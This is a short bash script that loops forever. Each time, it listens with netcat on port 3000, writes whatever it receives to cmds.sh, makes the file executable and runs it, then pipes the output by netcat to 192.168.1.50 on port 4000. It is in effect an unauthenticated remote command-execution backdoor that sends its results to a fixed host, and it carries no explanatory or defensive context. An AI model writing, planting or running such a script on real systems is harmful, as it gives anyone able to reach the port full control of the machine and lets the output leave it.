#!/bin/bash -u

while :
do
nc -lv -p 3000 -q 1 > cmds.sh < /dev/null
cat cmds.sh
chmod +x cmds.sh
./cmds.sh > out.txt
echo "sending ouput"
cat out.txt | nc 192.168.1.50 4000
sleep 1

done

